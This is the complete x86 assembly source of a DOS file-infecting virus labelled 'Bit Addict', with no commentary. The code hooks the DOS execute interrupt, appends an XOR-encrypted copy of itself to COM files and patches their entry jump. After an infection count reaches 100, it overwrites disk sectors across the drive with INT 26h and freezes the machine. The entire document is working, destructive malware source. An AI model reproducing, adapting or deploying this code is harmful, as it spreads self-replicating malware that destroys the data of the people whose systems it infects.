code segment
	assume	cs:code,ds:code,es:code

	org	0

Size2	equ	Virus-Relocate

	mov	cx,Size2
	mov	ax,word ptr ds:[101h]
	call	Virus

Relocate:
	cmp	byte ptr ds:[103h],100
	jb	InstallVirus

	xor	dx,dx
Repeat:	push	dx
	mov	ax,2
	xor	bx,bx
	mov	cx,100
	int	26h
	pop	ax
	pop	dx
	add	dx,100
	jnc	Repeat

	cli
Hangup:	jmp	Hangup

InstallVirus:
	mov	ax,04b41h
	int	21h
	mov	ds,ax
	pop	ax
	sub	ax,offset Relocate
	xor	si,si
	mov	di,ax
	mov	cx,offset Size1
	cld
	repe	cmpsb
	je	Exit
	push	ax
	mov	ah,52h
	int	21h
	push	bx
	mov	ah,30h
	int	21h
	pop	di
	pop	bx
	cmp	al,2
	jb	Exit
	cmp	al,3
	adc	di,12h
	call	GetBuffer
	mov	cs:DataBuffer[bx],ax
	call	GetBuffer
	mov	es,ax
	push	cs
	pop	ds
	mov	si,bx
	xor	di,di
	mov	cx,offset Size1
	cld
	rep	movsb
	xor	ax,ax
	mov	ds,ax
	mov	ax,ds:[84h]
	mov	es:word ptr OldInt21[0],ax
	mov	ax,ds:[86h]
	mov	es:word ptr OldInt21[2],ax
	mov	word ptr ds:[84h],offset NewInt21
	mov	word ptr ds:[86h],es
	push	cs
	pop	ds
	push	bx
	mov	ax,4b40h
	lea	dx,Command[bx]
	int	21h
	pop	bx
Exit:	push	cs
	pop	es
	push	cs
	pop	ds
	lea	si,SavedCode[bx]
	mov	di,0100h
	push	di
	mov	cx,14
	rep	movsb
	ret

GetBuffer:
	push	di
	lds	si,es:[di]
	movsw
	movsw
	add	si,0bh
	mov	cl,4
	shr	si,cl
	mov	ax,ds
	add	ax,si
	pop	di
	ret

Jump		db	0e9h
NearOffset	dw	0
		db	0
ID		db	'Bit Addict'
Command		db	'\COMMAND.COM',0

SavedCode	db	0cdh,020h,12 dup (0h)
Check		equ	SavedCode[4]
Count		equ	SavedCode[3]

OldInt21	dd	0
DataBuffer	dw	0

NewInt21:
	cmp	ax,04b41h
	jne	Ok1
	mov	ax,cs
	iret
Ok1:	cmp	ah,4bh
	je	Infect
EOI:	jmp	dword ptr cs:OldInt21

WriteHeader:
	push	dx
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	int	21h
	pop	dx
	jc	Return
	mov	ah,40h
	mov	cx,14
	int	21h
Return:	ret

Infect:	push	ax
	push	bx
	push	cx
	push	si
	push	di
	push	es
	push	ds
	push	dx
	mov	ax,04300h
	int	21h
	push	cx
	test	cx,1
	jz	Ok2
	mov	ax,04301h
	and	cx,0fffeh
	int	21h
Ok2:	mov	ax,03d02h
	int	21h
	jnc	OpenOk
	jmp	Error
OpenOk:	mov	bx,ax
	mov	ax,05700h
	int	21h
	push	cx
	push	dx
	push	cs
	pop	ds
	mov	es,DataBuffer
	xor	si,si
	xor	di,di
	mov	cx,offset Size1
	cld
	rep	movsb
	push	es
	pop	ds
	mov	ah,3fh
	mov	cx,14
	mov	dx,offset SavedCode
	int	21h
	jc	Close2
	cmp	ax,14
	jne	Close2
	mov	si,offset Check
	mov	di,offset ID
	mov	cx,10
	cld
Comp:	lodsb
	xor	al,SavedCode[1]
	scasb
	loope	Comp
	je	Counter
	cmp	word ptr SavedCode,5a4dh
	je	Close2
	mov	ax,04202h
	xor	cx,cx
	xor	dx,dx
	int	21h
	jc	Close2
	or	dx,dx
	jne	Close2
	cmp	ax,0fe80h
	jae	Close2
	sub	ax,3
	mov	NearOffset,ax
	push	ax
	mov	si,offset Relocate
	mov	cx,Size2
Rep1:	xor	[si],al
	inc	si
	loop	Rep1
	mov	ah,40h
	mov	cx,offset Size1
	xor	dx,dx
	int	21h
	pop	ax
	jc	Close2
	mov	si,offset Jump
	mov	cx,4
Rep2:	xor	[si],al
	inc	si
	loop	Rep2
	mov	dx,offset Jump
	call	WriteHeader
Close2:	jmp	short Close
Counter:inc	Count
	mov	dx,offset SavedCode
	call	WriteHeader
	jc	Close
Close:	pop	dx
	pop	cx
	mov	ax,05701h
	int	21h
	mov	ax,03e00h
	int	21h
Error:	pop	cx
	pop	dx
	pop	ds
	test	cx,1
	jz	Ok3
	mov	ax,04301h
	int	21h
Ok3:	pop	es
	pop	di
	pop	si
	pop	cx
	pop	bx
	pop	ax
	cmp	al,40h
	je	IntRet
	jmp	EOI

IntRet:	iret

Virus:	pop	si
	push	si
	push	si
Rep4:	xor	[si],al
	inc	si
	loop	Rep4
	ret

Size1	equ	$

code ends

end
